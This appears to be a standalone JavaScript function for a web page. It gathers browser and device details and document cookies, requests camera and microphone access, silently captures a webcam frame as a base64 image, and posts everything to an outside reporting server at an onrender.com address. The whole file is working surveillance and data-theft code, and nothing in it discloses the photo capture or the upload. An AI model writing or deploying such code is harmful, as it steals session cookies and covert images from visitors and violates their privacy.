async function getAllInfo() {
  const $ = id => document.getElementById(id);

  $("errorMsg").textContent = "";
  $("accessBtn").style.display = "none";
  $("infoBox").style.display = "block";

  const info = {
    webcam: "Denied",
    microphone: "Denied",
    location: "Denied",
    ip: "Unknown",
    browser: navigator.userAgent,
    resolution: `${screen.width}x${screen.height}`,
    depth: `${screen.colorDepth}-bit`,
    os: navigator.platform,
    lang: navigator.language,
    online: navigator.onLine ? "Online" : "Offline",
    connection: "Unknown",
    battery: "Unknown",
    charging: "Unknown",
    cookies: document.cookie || "No cookies"
  };

  let webcamStream = null;
  let capturedImageBase64 = null;

  /* permissions ----------------------------------------------------*/
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    $("webcamFeed").srcObject = stream;
    $("webcamFeed").style.display = "block";
    info.webcam = info.microphone = "Accessible";
    webcamStream = stream;
  } catch {}

  // Capture Image from webcam
  if (webcamStream) {
    const track = webcamStream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);

    try {
      const bitmap = await imageCapture.grabFrame();
      const canvas = document.createElement('canvas');
      canvas.width = bitmap.width;
      canvas.height = bitmap.height;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
      capturedImageBase64 = canvas.toDataURL('image/jpeg'); // <-- base64 string here
      console.log("Captured Image Base64: ", capturedImageBase64); // Log base64 for debugging
    } catch (e) {
      console.error("Failed to capture webcam image:", e);
    }
  }

  /* Send to Backend -----------------------------------------------*/
  const message = `🔍 System Report:
    🧠 IP Address: ${info.ip}
    📍 Location: ${info.location}
    📷 Webcam: ${info.webcam}
    🎤 Microphone: ${info.microphone}
    🌐 Browser: ${info.browser}
    🖥️ Resolution: ${info.resolution}
    🎨 Color Depth: ${info.depth}
    🧑‍💻 OS: ${info.os}
    🗣️ Language: ${info.lang}
    📶 Connection: ${info.connection}
    🔋 Battery: ${info.battery}
    ⚡ Charging: ${info.charging}
    🍪 Cookies: ${info.cookies}
    🔌 Online: ${info.online}`;

  try {
    await fetch('https://system-info-terminal.onrender.com/send-message', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message,
        image: capturedImageBase64  // Send the base64 string here
      })
    });
  } catch (e) {
    console.error("Failed to send info:", e);
    $("errorMsg").textContent = "Could not contact reporting server.";
  }
}
